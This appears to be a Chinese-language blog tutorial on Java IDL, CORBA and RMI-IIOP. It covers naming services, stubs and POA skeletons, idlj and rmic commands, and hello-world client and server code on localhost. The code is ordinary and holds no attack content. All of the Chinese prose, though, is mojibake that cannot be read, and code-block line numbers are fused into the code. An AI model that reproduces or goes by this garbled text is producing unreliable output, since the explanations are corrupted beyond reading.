    <content type="text"><![CDATA[Âü∫Á°ÄIDL‰∏éJava IDLIDLÔºàInterface Definition LanguageÔºâÊé•Âè£ÂÆö‰πâËØ≠Ë®ÄÔºåÂÆÉ‰∏ªË¶ÅÁî®‰∫éÊèèËø∞ËΩØ‰ª∂ÁªÑ‰ª∂ÁöÑÂ∫îÁî®Á®ãÂ∫èÁºñÁ®ãÊé•Âè£ÁöÑ‰∏ÄÁßçËßÑËåÉËØ≠Ë®Ä„ÄÇÂÆÉÂÆåÊàê‰∫Ü‰∏éÂêÑÁßçÁºñÁ®ãËØ≠Ë®ÄÊó†ÂÖ≥ÁöÑÊñπÂºèÊèèËø∞Êé•Âè£Ôºå‰ªéËÄåÂÆûÁé∞‰∫Ü‰∏çÂêåËØ≠Ë®Ä‰πãÈó¥ÁöÑÈÄö‰ø°ÔºåËøôÊ†∑Â∞±‰øùËØÅ‰∫ÜË∑®ËØ≠Ë®ÄË∑®ÁéØÂ¢ÉÁöÑËøúÁ®ãÂØπË±°Ë∞ÉÁî®„ÄÇ JAVA IDLÊòØ‰∏Ä‰∏™ÂàÜÂ∏ÉÁöÑÂØπË±°ÊäÄÊúØÔºåÂÖÅËÆ∏ÂÖ∂ÂØπË±°Âú®‰∏çÂêåÁöÑËØ≠Ë®ÄÈó¥ËøõË°å‰∫§‰∫í„ÄÇÂÆÉÁöÑÂÆûÁé∞ÊòØÂü∫‰∫éÂÖ¨ÂÖ±ÂØπË±°‰ª£ÁêÜ‰ΩìÁ≥ª(Common Object Request Brokerage Architecture,CORBA)Ôºå‰∏Ä‰∏™Ë°å‰∏öÊ†áÂáÜÁöÑÂàÜÂ∏ÉÂºèÂØπË±°Ê®°Âûã„ÄÇÊØè‰∏™ËØ≠Ë®ÄÊîØÊåÅCORBAÈÉΩÊúâ‰ªñ‰ª¨Ëá™Â∑±ÁöÑIDL MappingÊò†Â∞ÑÂÖ≥Á≥ªÔºåIDLÂíåJAVAÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÂèØ‰ª•ÂèÇËÄÉÊñáÊ°£Java IDL: IDL to Java Language Mapping Âú®jdkÂÆâË£ÖÂêéÔºå‰ºöÈôÑÂ∏¶ÊúâidljÁºñËØëÂô®Ôºå‰ΩøÁî®idljÂëΩ‰ª§ÂèØ‰ª•Â∞ÜIDLÊñá‰ª∂ÁºñËØëÊàêjavaÊñá‰ª∂ COBARCORBA(Common ObjectRequest Broker Architecture)ÂÖ¨ÂÖ±ÂØπË±°ËØ∑Ê±Ç‰ª£ÁêÜ‰ΩìÁ≥ªÁªìÊûÑÔºåÊòØÁî±OMGÁªÑÁªáÂà∂ËÆ¢ÁöÑ‰∏ÄÁßçÊ†áÂáÜÂàÜÂ∏ÉÂºèÂØπË±°ÁªìÊûÑ„ÄÇÂÖ∂ÊèêÂá∫ÊòØ‰∏∫‰∫ÜËß£ÂÜ≥‰∏çÂêåÂ∫îÁî®Èó¥ÁöÑÈÄö‰ø°ÔºåÊõæÊòØÂàÜÂ∏ÉÂºèËÆ°ÁÆóÁöÑ‰∏ªÊµÅÊäÄÊúØ„ÄÇ CORBAÁªìÊûÑÂàÜ‰∏∫‰∏âÈÉ®ÂàÜÔºö naming service client side servant side ‰ªñ‰ª¨‰πãÈó¥ÁöÑÂÖ≥Á≥ªÁÆÄÂçïÁêÜËß£‰∏∫Ôºöclient side‰ªénaming service‰∏≠Ëé∑ÂèñÊúçÂä°Êñπservant side‰ø°ÊÅØ„ÄÇservant sideÈúÄË¶ÅÂú®naming service‰∏≠Ê≥®ÂÜåÔºåËøôÊ†∑client sideÂú®Ë¶ÅËÆøÈóÆÂÖ∑‰ΩìÂÜÖÂÆπÊó∂‰ºöÂÖàÂéªnaming serviceÊü•ÊâæÔºå‰ª•ÊâæÂà∞ÂØπÂ∫îÁöÑservant sideÊúçÂä°„ÄÇ ÂèØ‰ª•ÁêÜËß£‰∏∫ÁõÆÂΩï‰∏éÁ´†ËäÇÂÖ∑‰ΩìÂÜÖÂÆπÂÖ∑‰ΩìÂÖ≥Á≥ªÔºönaming serviceÁõÆÂΩïÔºåservant side‰∏∫ÂÜÖÂÆπÔºåÁõÆÁöÑÂ∞±ÊòØ‰∏∫‰∫ÜËÆ©client sideÂø´ÈÄü‰ªéÁõÆÂΩïÊâæÂà∞ÂÜÖÂÆπ„ÄÇ CORBAÈÄö‰ø°ËøáÁ®ãÂú®CORBAÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®‰πãÈó¥ËøõË°åËøúÁ®ãË∞ÉÁî®Ê®°ÂûãÂ¶Ç‰∏ãÔºö Âú®ÂÆ¢Êà∑Á´ØÔºåÂ∫îÁî®Á®ãÂ∫èÂåÖÂê´ËøúÁ®ãÂØπË±°ÁöÑÂºïÁî®ÔºåÂØπË±°ÂºïÁî®ÂÖ∑ÊúâÂ≠òÊ†π(stub)ÊñπÊ≥ïÔºåÂ≠òÊ†πÊñπÊ≥ïÊòØËøúÁ®ãË∞ÉÁî®ËØ•ÊñπÊ≥ïÁöÑÊõøË∫´„ÄÇÂ≠òÊ†πÂÆûÈôÖ‰∏äÊòØËøûÊé•Âà∞ORB(Object Request Broker)ÂØπË±°ËØ∑Ê±Ç‰ª£ÁêÜÁöÑÔºåÂõ†Ê≠§Ë∞ÉÁî®ÂÆÉ‰ºöË∞ÉÁî®ORBÁöÑËøûÊé•ÂäüËÉΩÔºåËØ•ÂäüËÉΩ‰ºöÂ∞ÜË∞ÉÁî®ËΩ¨ÂèëÂà∞ÊúçÂä°Âô®„ÄÇ Âú®ÊúçÂä°Âô®Á´ØÔºåORB‰ΩøÁî®Ê°ÜÊû∂‰ª£Á†ÅÂ∞ÜËøúÁ®ãË∞ÉÁî®ËΩ¨Êç¢‰∏∫ÂØπÊú¨Âú∞ÂØπË±°ÁöÑÊñπÊ≥ïË∞ÉÁî®„ÄÇÊ°ÜÊû∂Â∞ÜË∞ÉÁî®Âíå‰ªª‰ΩïÂèÇÊï∞ËΩ¨Êç¢‰∏∫ÂÖ∂ÁâπÂÆö‰∫éÂÆûÁé∞ÁöÑÊ†ºÂºèÔºåÂπ∂Ë∞ÉÁî®ÂÆ¢Êà∑Á´ØÊÉ≥Ë¶ÅË∞ÉÁî®ÁöÑÊñπÊ≥ï„ÄÇÊñπÊ≥ïËøîÂõûÊó∂ÔºåÊ°ÜÊû∂‰ª£Á†ÅÂ∞ÜËΩ¨Êç¢ÁªìÊûúÊàñÈîôËØØÔºåÁÑ∂ÂêéÈÄöËøáORBÂ∞ÜÂÖ∂ÂèëÈÄÅÂõûÂÆ¢Êà∑Á´Ø„ÄÇ Âú®ORB‰πãÈó¥ÔºåÈÄö‰ø°ÈÄöËøáIIOP(the Internet Inter-ORB Protocol)‰∫íËÅîÁΩëÂÜÖÈÉ®ÂØπË±°ËØ∑Ê±Ç‰ª£ÁêÜÂçèËÆÆËøõË°å„ÄÇÂü∫‰∫éÊ†áÂáÜTCP/IP InternetÂçèËÆÆÁöÑIIOPÊèê‰æõ‰∫ÜCORBAÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Á´Ø‰πãÈó¥ÈÄö‰ø°ÁöÑÊ†áÂáÜ„ÄÇ ‰ΩøÁî®JAVA IDLÁºñÂÜôCORBAÂàÜÂ∏ÉÂºèÂ∫îÁî®ÁºñÂÜôIDLCORBA‰ΩøÁî®IDL‰æõÁî®Êà∑ÊèèËø∞Á®ãÂ∫èÊé•Âè£Ôºå ÊâÄ‰ª•ËøôÈáåÁ¨¨‰∏ÄÊ≠•Â∞±ÊòØÁºñÂÜôidlÊèèËø∞Êé•Âè£ÔºåÂàõÂª∫Hello.idlÊñá‰ª∂Ôºö1234567module HelloApp&#123; interface Hello &#123; string sayHello(); &#125;;&#125;; ËØ•ÊÆµ‰ª£Á†ÅÊèèËø∞‰∫ÜHelloÊé•Âè£‰∏≠ÂåÖÂê´sayHello()ÊñπÊ≥ïÔºå‰ªñ‰ºöËøîÂõûÂ≠óÁ¨¶‰∏≤Á±ªÂûãÊï∞ÊçÆ„ÄÇ ÁºñËØëÁîüÊàêclient side classesÊé•ÁùÄ‰ΩøÁî®JAVAÁöÑIDLÁºñËØëÂô®idljÔºåÂ∞ÜidlÊñá‰ª∂ÁºñËØëÊàêclassÊñá‰ª∂:1idlj -fclient Hello.idl ÂàõÂª∫‰∫Ü‰∏Ä‰∏™Êñ∞ÁõÆÂΩïHelloAppÔºåÂπ∂ÁîüÊàê‰∫Ü5‰∏™Êñ∞Êñá‰ª∂Ôºö ‰ªñ‰ª¨‰πãÈó¥ÁöÑÂÖ≥Á≥ªÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö ÂõæÁâáÊù•Ê∫êÔºöAn Introduction To The CORBA And Java RMI-IIOP ÂèÇËÄÉ‰ª£Á†ÅÔºåÁÆÄÂçïÊ¶ÇÊã¨‰∏Ä‰∏ã: HelloOperationsÊé•Âè£‰∏≠ÂÆö‰πâsayHello()ÊñπÊ≥ï HelloÁªßÊâø‰∫ÜHelloOperations _HelloStubÁ±ªÂÆûÁé∞‰∫ÜHelloÊé•Âè£Ôºåclient side‰ΩøÁî®helloÊé•Âè£Ë∞ÉÁî®servant side„ÄÇ HelloHelperÁ±ªÂÆûÁé∞ÁΩëÁªú‰º†ËæìÔºåÊï∞ÊçÆÁºñÁ†ÅÂíåËß£Á†ÅÁöÑÂ∑•‰Ωú„ÄÇ ËØ¶ÁªÜÂàÜÊûê‰∏Ä‰∏ãÂá†ÊÆµÊ†∏ÂøÉ‰ª£Á†ÅÔºåÂÖàÊù•Áúã‰∏Ä‰∏ã_HelloStub.java‰∏≠sayHello()ÁöÑÂÆûÁé∞Ôºö123456789101112131415161718public String sayHello ()&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true); $in = _invoke ($out); String $result = $in.read_string (); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return sayHello ( ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // sayHello ‰ΩøÁî®org.omg.CORBA.portableÁöÑInputStreamÂíåOutputStreamÊù•Ë°®Á§∫Ë∞ÉÁî®ÁöÑËØ∑Ê±ÇÂíåÂìçÂ∫îÔºåÈÄöËøá_request()Âíå_invoke()ÊñπÊ≥ïË∞ÉÁî®ÂæóÂà∞ÁªìÊûú„ÄÇ Âè¶Â§ñÂú®HelloHelperÁ±ª‰∏≠Ë¥üË¥£Â§ÑÁêÜÂØπË±°ÁΩëÁªú‰º†ËæìÁöÑÁºñÁ†ÅÂíåËß£Á†ÅÔºåÊù•Áúã‰∏Ä‰∏ãnarrowÊñπÊ≥ïÔºö12345678910111213141516public static HelloApp.Hello narrow (org.omg.CORBA.Object obj)&#123; if (obj == null) return null; else if (obj instanceof HelloApp.Hello) return (HelloApp.Hello)obj; else if (!obj._is_a (id ())) throw new org.omg.CORBA.BAD_PARAM (); else &#123; org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate (); HelloApp._HelloStub stub = new HelloApp._HelloStub (); stub._set_delegate(delegate); return stub; &#125;&#125; Êé•Âèó‰∏Ä‰∏™org.omg.CORBA.ObjectÂØπË±°‰Ωú‰∏∫ÂèÇÊï∞ÔºåËøîÂõûstub„ÄÇ ÁºñËØëÁîüÊàêservant sideÊâßË°åÂëΩ‰ª§Ôºö1idlj -fserver Hello.idl ‰ºöÁîüÊàê‰∏â‰∏™Êñá‰ª∂ÔºåÈô§‰∫ÜHelloPOA.java,ÂÖ∂‰ΩôÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ POA(Portable Object Adapter)ÊòØ‰æøÊê∫ÂºèÂØπË±°ÈÄÇÈÖçÂô®ÔºåÂÆÉÊòØCORBAËßÑËåÉÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇËøôÈáåÁöÑËøô‰∏™POAËôöÁ±ªÊòØservant sideÁöÑÊ°ÜÊû∂Á±ªÔºåÂÆÉÊèê‰æõ‰∫ÜÊñπÊ≥ïÂ∏ÆÂä©Êàë‰ª¨Â∞ÜÂÖ∑‰ΩìÂÆûÁé∞ÂØπË±°Ê≥®ÂÜåÂà∞naming service‰∏ä„ÄÇ Êù•Áúã‰∏Ä‰∏ãÂÖ∂Ê†∏ÂøÉ‰ª£Á†ÅÔºö12345678910111213141516171819202122232425262728293031323334353637383940public abstract class HelloPOA extends org.omg.PortableServer.Servant implements HelloApp.HelloOperations, org.omg.CORBA.portable.InvokeHandler&#123; // Constructors private static java.util.Hashtable _methods = new java.util.Hashtable (); static &#123; _methods.put ("sayHello", new java.lang.Integer (0)); &#125; public org.omg.CORBA.portable.OutputStream _invoke (String $method, org.omg.CORBA.portable.InputStream in, org.omg.CORBA.portable.ResponseHandler $rh) &#123; org.omg.CORBA.portable.OutputStream out = null; java.lang.Integer __method = (java.lang.Integer)_methods.get ($method); if (__method == null) throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); switch (__method.intValue ()) &#123; case 0: // HelloApp/Hello/sayHello &#123; String $result = null; $result = this.sayHello (); out = $rh.createReply(); out.write_string ($result); break; &#125; default: throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); &#125; return out; &#125; // _invoke//... ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØ‰ªñ‰πüÂÆûÁé∞‰∫ÜHelloOperationsÊé•Âè£Ôºå‰ª£Á†ÅÁöÑÊúÄÂºÄÂßãÂ∞ÜsayHelloÊñπÊ≥ïÊîæÂÖ•‰∏Ä‰∏™hashtable‰∏≠Ôºå_invokeÊñπÊ≥ï‰∏≠ÔºåÂ∞ÜË∞ÉÁî®sayHello()ÁöÑÁªìÊûúÈÄöËøáorg.omg.CORBA.portable.ResponseHandlerÂØπË±°ÈÄöËøáÁΩëÁªú‰º†ËæìÂà∞client side„ÄÇ Ê≠§Êó∂idjlÁîüÊàêÁöÑÂÖ®ÈÉ®classÁöÑÂÖ≥Á≥ªÂõæÔºö Êé•‰∏ãÊù•ÔºåË¶ÅÂÅöÁöÑÂ∞±ÊòØÁî®Êà∑Ëá™Â∑±ÂÆûÁé∞client sideÂíåservant side‰∏≠ÂÖ∑‰ΩìÁöÑÊñπÊ≥ïÊìç‰Ωú„ÄÇ servant sideÂÆûÁé∞ÂØπ‰∫éservant sideËÄåË®ÄÔºåÂÆûÁé∞‰∏Ä‰∏™HelloImplÁ±ªÊù•ÁªßÊâøHelloPOAÁ±ªÂÆûÁé∞sayHello()ÊñπÊ≥ïÔºö1234567891011121314151617package HelloApp;import org.omg.CORBA.ORB;public class HelloImpl extends HelloPOA &#123; private ORB orb; public void setORB(ORB orbVal) &#123; orb = orbVal; &#125; @Override public String sayHello() &#123; return "\nHello, world!\n"; &#125;&#125; Ê≠§Êó∂ÁöÑÁªßÊâøÂÖ≥Á≥ªÂ¶Ç‰∏ãÔºö Êé•ÁùÄÔºåÈúÄË¶ÅÂÜô‰∏Ä‰∏™ÊúçÂä°Á´ØHelloServerÁ±ªÊù•Êé•Âèóclient sideÂØπHelloImpl.sayHello()ÁöÑË∞ÉÁî®„ÄÇ ‰∏â‰∏™ÈÉ®ÂàÜÔºö Á¨¨‰∏ÄÈÉ®ÂàÜÊ†πÊçÆ‰º†ÂÖ•ÁöÑname serviceÂú∞ÂùÄÂèÇÊï∞Êù•ÂàõÂª∫ÔºåÊ†πÊçÆCORBAÁöÑËßÑËåÉÔºåÈÄöËøáORBËé∑Âèñ‰∏Ä‰∏™ÂêçÁß∞‰∏∫RootPOAÁöÑPOAÂØπË±°„ÄÇ(ÂÖ∂‰∏≠name serviceÁî±jdk‰∏≠ÁöÑorbdÊèê‰æõ) Á¨¨‰∫åÈÉ®ÂàÜÂ∞±ÊòØÂ∞ÜÂÖ∑‰ΩìÂÆûÁé∞Á±ªÊ≥®ÂÜåÂà∞naming service‰∏≠ÔºåÁî®orbËé∑ÂèñÂà∞name serviceÔºåÂ∞ÜHelloImplÂØπË±°‰ª•Hello‰∏∫ÂêçÁªëÂÆö„ÄÇ Á¨¨‰∏âÈÉ®ÂàÜÂ∞±ÊòØÂ∞ÜserverËÆæÁΩÆ‰∏∫ÁõëÂê¨Áä∂ÊÄÅÊåÅÁª≠ËøêË°åÔºåÁî®‰∫éÊã¶Êà™Âπ∂Â§ÑÁêÜclient sideÁöÑËØ∑Ê±ÇÔºåËøîÂõûÁõ∏Â∫îÁöÑÂÖ∑‰ΩìÂÆûÁé∞Á±ª„ÄÇ Client SideÂÆûÁé∞12345678910111213141516171819202122232425262728293031package HelloApp;import org.omg.CORBA.ORB;import org.omg.CosNaming.NamingContext;import org.omg.CosNaming.NamingContextExt;import org.omg.CosNaming.NamingContextExtHelper;import org.omg.CosNaming.NamingContextHelper;import java.util.Properties;public class HelloClient &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object objRef = orb.resolve_initial_references("NameService"); NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef); String name = "Hello"; // helloImplÁöÑÁ±ªÂûã‰∏∫_HelloStubÔºåËÄå‰∏çÊòØÁúüÊ≠£ÁöÑhelloImpl helloImpl = HelloHelper.narrow(ncRef.resolve_str(name)); System.out.println(helloImpl.sayHello()); &#125;&#125; È¶ñÂÖàÂíåÊúçÂä°Á´Ø‰∏ÄÊ†∑ÔºåÈúÄË¶ÅÂàùÂßãÂåñORBÔºåÈÄöËøáORBÊù•Ëé∑ÂèñNameServiceÂπ∂Â∞ÜÂÖ∂ËΩ¨Êç¢ÊàêÂëΩÂêç‰∏ä‰∏ãÊñá„ÄÇ‰πãÂêéÈÄöËøáÂà´ÂêçÂú®ÂëΩÂêç‰∏ä‰∏ãÊñá‰∏≠Ëé∑ÂèñÂÖ∂ÂØπÂ∫îÁöÑStubÔºåË∞ÉÁî®Stub‰∏≠ÁöÑsayhello()ÊñπÊ≥ïÔºåËøô‰∏™Êó∂ÂÄôÊâç‰ºöÂÆåÊàêclient sideÂêëservant sideÂèëÈÄÅËØ∑Ê±ÇÔºåPOAÂ§ÑÁêÜËØ∑Ê±ÇÔºåÂπ∂Â∞ÜÂÖ∑‰ΩìÂÆûÁé∞ÁöÑHelloImplÂåÖË£ÖËøîÂõûÁªôclient side„ÄÇ naming serviceÂÆûÁé∞ORBDÂèØ‰ª•ÁêÜËß£‰∏∫ORBÁöÑÂÆàÊä§ËøõÁ®ã(daemon)ÔºåÂÖ∂‰∏ªË¶ÅË¥üË¥£Âª∫Á´ãÂÆ¢Êà∑Á´Ø(client side)‰∏éÊúçÂä°Á´Ø(servant side)ÁöÑÂÖ≥Á≥ªÔºåÂêåÊó∂Ë¥üË¥£Êü•ÊâæÊåáÂÆöÁöÑIOR(ÂèØ‰∫íÊìç‰ΩúÂØπË±°ÂºïÁî®ÔºåÊòØ‰∏ÄÁßçÊï∞ÊçÆÁªìÊûÑÔºåÊòØCORBAÊ†áÂáÜÁöÑ‰∏ÄÈÉ®ÂàÜ)„ÄÇORBDÊòØÁî±JavaÂéüÁîüÊîØÊåÅÁöÑ‰∏Ä‰∏™ÊúçÂä°ÔºåÂÖ∂Âú®Êï¥‰∏™CORBAÈÄö‰ø°‰∏≠ÂÖÖÂΩìÁùÄnaming serviceÁöÑ‰ΩúÁî®ÔºåÂèØ‰ª•ÈÄöËøá‰∏ÄË°åÂëΩ‰ª§ËøõË°åÂêØÂä®Ôºö1orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1 ÊâßË°åÊé•ÁùÄÂàÜÂà´Âú®HelloServerÂíåHelloClientÈÖçÁΩÆname serviceÂú∞ÂùÄÔºö ÂÖ∂Ê¨°‰æùÊ¨°ÂêØÂä®name service„ÄÅHelloServer„ÄÅHelloClientÁªìÊûúÂ¶Ç‰∏äÂõæÊâÄÁ§∫„ÄÇ Ê≠§Â§ñÔºåÈô§‰∫Ü‰∏äËø∞ÂÖàËé∑ÂèñNameServerÔºåÂêéÈÄöËøáresolve_str()ÊñπÊ≥ïÁîüÊàê(NameServerÊñπÂºè)ÁöÑstubÔºåËøòÊúâ‰∏§ÁßçÔºö ‰ΩøÁî®ORB.string_to_objectÁîüÊàêÔºàORBÁîüÊàêÊñπÂºèÔºâ ‰ΩøÁî®javax.naming.InitialContext.lookup()ÁîüÊàêÔºàJNDIÁîüÊàêÊñπÂºèÔºâ ‰ª£Á†ÅÂàÜÂà´Â¶Ç‰∏ã:orbÊñπÂºè1234567891011public class HelloClietORB &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object obj = orb.string_to_object("corbaname::127.0.0.1:1050#Hello"); Hello hello = HelloHelper.narrow(obj); System.out.println(hello.sayHello()); &#125;&#125; 1234567891011121314public class HelloClientORB2 &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object obj = orb.string_to_object("corbaloc::127.0.0.1:1050"); NamingContextExt ncRef = NamingContextExtHelper.narrow(obj); Hello hello = HelloHelper.narrow(ncRef.resolve_str("Hello")); System.out.println(hello.sayHello()); &#125; &#125; JDNIÊñπÂºèÔºö12345678910111213public class HelloClientJNDI &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); Hashtable env = new Hashtable(5, 0.75f); env.put("java.naming.corba.orb", orb); Context ic = new InitialContext(env); Hello helloRef = HelloHelper.narrow((org.omg.CORBA.Object)ic.lookup("corbaname::127.0.0.1:1050#Hello")); System.out.println(helloRef.sayHello()); &#125;&#125; CORBAÁΩëÁªúÊµÅÈáèÂàÜÊûêservant sideÊúçÂä°Á´ØÊµÅÈáèÂ§ßËá¥ÂàÜ‰∏∫‰∏§‰∏™ÈÉ®ÂàÜÔºö Ëé∑ÂèñNaming Service Ê≥®ÂÜåservant side Ëé∑ÂèñNaming ServiceÁöÑÊµÅÈáèÂ¶Ç‰∏ãÔºöÂú®ËøîÂõûÁöÑÂìçÂ∫î‰∏≠ÔºåÊãøÂà∞‰∫ÜRootPOAÔºöÂØπÂ∫îÁöÑ‰ª£Á†Å‰∏∫Ôºö Êé•ÁùÄÊ£ÄÊµãËé∑ÂèñÂà∞ÁöÑNamingServiceÂØπË±°ÊòØÂê¶‰∏∫NamingContextExtÁ±ªÁöÑÁ§∫‰æãÔºöÂØπÂ∫î‰ª£Á†ÅÔºö ÊúÄÂêéÂèëÈÄÅop=to_nameÂíåop=rebind‰∏§‰∏™Êåá‰ª§ÔºöÂàÜÂà´‰∏∫ËÆæÁΩÆÂºïÁî®ÂêçÔºåÂíåËÆæÁΩÆÁªëÂÆö‰ø°ÊÅØÔºåÊù•Áúã‰∏Ä‰∏ãop=rebindÁöÑÊï∞ÊçÆÂåÖÔºöËøôÈáåÈÄöËøáIOR‰ø°ÊÅØË°®Á§∫‰∫Üservant sideÁöÑÁõ∏ÂÖ≥rpc‰ø°ÊÅØ„ÄÇ client sideËøôÈáå‰ª•NameServerÊñπÂºèÁîüÊàêstub‰∏∫‰æãÔºö Ëé∑Âèñnameservice„ÄÅop=_is_aÂà§Êñ≠ Ê†πÊçÆÂºïÁî®ÂêçËé∑Âèñservant sideÁöÑÊé•Âè£Stub ÂèëÈÄÅÊñπÊ≥ïÂêçÔºåË∞ÉÁî®ËøúÁ®ãÊñπÊ≥ïÔºåÂæóÂà∞ÁªìÊûúÂàÜÂà´ÂØπÂ∫î‰ª£Á†ÅÊ≠•È™§Ôºö RMI-IIOPRMI-IIOPÂá∫Áé∞‰ª•ÂâçÔºåÂè™ÊúâRMIÂíåCORBA‰∏§ÁßçÈÄâÊã©Êù•ËøõË°åÂàÜÂ∏ÉÂºèÁ®ãÂ∫èËÆæËÆ°Ôºå‰∫åËÄÖ‰πãÈó¥‰∏çËÉΩÂçè‰Ωú„ÄÇRMI-IIOPÁªºÂêà‰∫ÜRMIÂíåCORBAÁöÑ‰ºòÁÇπÔºåÂÖãÊúç‰∫Ü‰ªñ‰ª¨ÁöÑÁº∫ÁÇπÔºå‰ΩøÂæóÁ®ãÂ∫èÂëòËÉΩÊõ¥Êñπ‰æøÁöÑÁºñÂÜôÂàÜÂ∏ÉÂºèÁ®ãÂ∫èËÆæËÆ°ÔºåÂÆûÁé∞ÂàÜÂ∏ÉÂºèËÆ°ÁÆó„ÄÇ Demo: RMI-IIOPËøúÁ®ãË∞ÉÁî®ÂèÇËÄÉÊñáÊ°£Tutorial: Getting Started Using RMI-IIOPÊâÄËø∞Ôºå‰∏ÄÂÖ±Âõõ‰∏™Ê≠•È™§ÔºåÂØπÂ∫îÁöÑÊñá‰ª∂Â¶Ç‰∏ãÔºö ÂÆö‰πâËøúÁ®ãÊé•Âè£Á±ªÔºöHelloInterface.java ÁºñÂÜôÂÆûÁé∞Á±ªÔºöHelloImpl.java, ÂÆûÁé∞Êé•Âè£HelloInterface ÁºñÂÜôÊúçÂä°Á´ØÁ±ªÔºöHelloServer.java, RMIÊúçÂä°Á´ØÂÆû‰æãËøúÁ®ãÁ±ªÔºåÂ∞ÜÂÖ∂ÁªëÂÆöÂà∞name service‰∏≠ ÁºñÂÜôÂÆ¢Êà∑Á´ØÁ±ªÔºöHelloClient.java, Ë∞ÉÁî®ËøúÁ®ãÊñπÊ≥ïsayHello() ÂÆûÁé∞Êé•Âè£Á±ªÔºåÂøÖÈ°ªË¶ÅÂÆûÁé∞RemoteËøúÁ®ãÁ±ªÔºå‰∏îÊäõÂá∫java.rmi.RemoteExceptionÂºÇÂ∏∏„ÄÇHelloInterface.java12345import java.rmi.Remote;public interface HelloInterface extends java.rmi.Remote &#123; public void sayHello( String from ) throws java.rmi.RemoteException;&#125; ÂÆûÁé∞Êé•Âè£Á±ªÔºåÂøÖÈ°ªÂÜôÊûÑÈÄ†ÊñπÊ≥ïË∞ÉÁî®Áà∂Á±ªÊûÑÈÄ†ÊñπÊ≥ïÔºåÁªôËøúÁ®ãÂØπË±°ÂàùÂßãÂåñ‰ΩøÁî®ÔºåÂêåÊó∂Ë¶ÅÂÆûÁé∞‰∏Ä‰∏™ÊñπÊ≥ïÁªôËøúÁ®ãË∞ÉÁî®‰ΩøÁî®(sayHello())HelloImpl.java123456789101112import javax.rmi.PortableRemoteObject;public class HelloImpl extends PortableRemoteObject implements HelloInterface &#123; public HelloImpl() throws java.rmi.RemoteException &#123; super(); // invoke rmi linking and remote object initialization &#125; public void sayHello( String from ) throws java.rmi.RemoteException &#123; System.out.println( "Hello from " + from + "!!" ); System.out.flush(); &#125;&#125; ÁºñÂÜôÊúçÂä°Á´ØÔºåÂàõÂª∫servantÂÆû‰æãÔºåÁªëÂÆöÂØπË±°„ÄÇHelloServer.java1234567891011121314151617181920212223242526272829303132import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Hashtable;public class HelloServer &#123; public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory"; public static void main(String[] args) &#123; try &#123; //ÂÆû‰æãÂåñHello servant HelloImpl helloRef = new HelloImpl(); //‰ΩøÁî®JNDIÂú®ÂëΩÂêçÊúçÂä°‰∏≠ÂèëÂ∏ÉÂºïÁî® InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050"); initialContext.rebind("HelloService", helloRef); System.out.println("Hello Server Ready..."); Thread.currentThread().join(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static InitialContext getInitialContext(String url) throws NamingException &#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY); env.put(Context.PROVIDER_URL, url); return new InitialContext(env); &#125;&#125; ÁºñÂÜôÂÆ¢Êà∑Á´ØÁ±ªÔºåËøúÁ®ãË∞ÉÁî®sayHello()ÊñπÊ≥ï„ÄÇHelloClient.java1234567891011121314151617181920212223242526272829303132333435import javax.naming.Context;import javax.naming.InitialContext;import javax.rmi.PortableRemoteObject;import java.util.Hashtable;public class HelloClient &#123; public static void main( String args[] ) &#123; Context ic; Object objref; HelloInterface hi; try &#123; Hashtable env = new Hashtable(); env.put("java.naming.factory.initial", "com.sun.jndi.cosnaming.CNCtxFactory"); env.put("java.naming.provider.url", "iiop://127.0.0.1:1050"); ic = new InitialContext(env); // STEP 1: Get the Object reference from the Name Service // using JNDI call. objref = ic.lookup("HelloService"); System.out.println("Client: Obtained a ref. to Hello server."); // STEP 2: Narrow the object reference to the concrete type and // invoke the method. hi = (HelloInterface) PortableRemoteObject.narrow( objref, HelloInterface.class); hi.sayHello( " MARS " ); &#125; catch( Exception e ) &#123; System.err.println( "Exception " + e + "Caught" ); e.printStackTrace( ); &#125; &#125;&#125; ÁºñËØëÁºñËØëËøúÁ®ãÊé•Âè£ÂÆûÁé∞Á±ª:1javac -d . -classpath . HelloImpl.java ÁªôÂÆûÁé∞Á±ªÂàõÂª∫stubÂíåskeleton(ÁÆÄÂçïÁêÜËß£Âç≥jvm‰∏≠ÁöÑÂ•óÊé•Â≠óÈÄö‰ø°Á®ãÂ∫è)Ôºö1rmic -iiop HelloImpl ÊâßË°åÂÆåÂêé‰ºöÂàõÂª∫‰∏§‰∏™Êñá‰ª∂Ôºö _HelloInterface_Stub.classÔºö ÂÆ¢Êà∑Á´ØÁöÑstub _HelloImpl_Tie.classÔºöÊúçÂä°Á´ØÁöÑskeleton ÁºñËØëÔºö1javac -d . -classpath . HelloInterface.java HelloServer.java HelloClient.java 